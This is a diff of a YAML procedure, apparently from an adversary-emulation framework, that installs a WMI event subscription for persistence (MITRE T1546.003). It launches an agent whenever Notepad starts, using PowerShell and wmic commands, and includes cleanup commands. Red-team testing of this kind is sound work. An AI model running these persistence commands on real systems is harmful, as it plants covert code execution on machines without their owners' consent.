@@ -1,53 +1,30 @@
 id: 8421540e-6261-4617-8fd1-c77d8215a78f
 name: Install WMI event subscription
 description: >-
-  This procedure installs a WMI event subscripton as persistence mechanism which
+  This procedure installs a WMI event subscription as persistence mechanism which
   will execute the Pneuma agent when Notepad is launched.
 tactic: persistence
 technique:
   id: T1546.003
-  name: Windows Management Instrumentation Event Subscription
+  name: 'Event Triggered Execution: Windows Management Instrumentation Event Subscription'
 platforms:
   windows:
     psh:
-      command: >-
+      command: |
         $FilterArgs = @{name='TestFilter';
                         EventNameSpace='root\cimv2';
                         QueryLanguage="WQL";
                         Query="SELECT * FROM __InstanceCreationEvent Within 15 Where (TargetInstance Isa 'Win32_Process' AND TargetInstance.Name = 'notepad.exe')"};
-        $Filter=New-CimInstance -Namespace root/subscription -ClassName
-        __EventFilter -Property $FilterArgs
-         
-        $ConsumerArgs = @{name='TestConsumer';
-                        CommandLineTemplate="#{agent.location}";}
-        $Consumer=New-CimInstance -Namespace root/subscription -ClassName
-        CommandLineEventConsumer -Property $ConsumerArgs
-         
-        $FilterToConsumerArgs = @{
-
-        Filter = [Ref] $Filter;
-
-        Consumer = [Ref] $Consumer;
-
-        }
-
-        $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription
-        -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
-
-
-        <# Cleanup #>
-
-        Get-WMIObject -Namespace root/subscription -Class __EventFilter -Filter
-        "Name = 'TestFilter'" | Remove-WmiObject
-
-        Get-WMIObject -Namespace root/subscription -Class
-        CommandLineEventConsumer -Filter "Name = 'TestConsumer'" |
-        Remove-WmiObject
-
-        Get-WMIObject -Namespace root\Subscription -Class
-        __FilterToConsumerBinding -Filter "__Path LIKE '%Test%'" |
-        Remove-WmiObject
-      variants: []
+        $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
+        $ConsumerArgs = @{name='TestConsumer'; CommandLineTemplate="#{agent.location}";}
+        $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
+        $FilterToConsumerArgs = @{ Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }
+        $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
+      variants:
+        - command: |
+            Get-WMIObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'TestFilter'" | Remove-WmiObject
+            Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'TestConsumer'" | Remove-WmiObject
+            Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Test%'" | Remove-WmiObject
     cmd:
       command: >-
         wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE
@@ -66,4 +43,4 @@ metadata:
   authors:
     - traceflow
   tags: []
-  enabled: true
+  chains: []
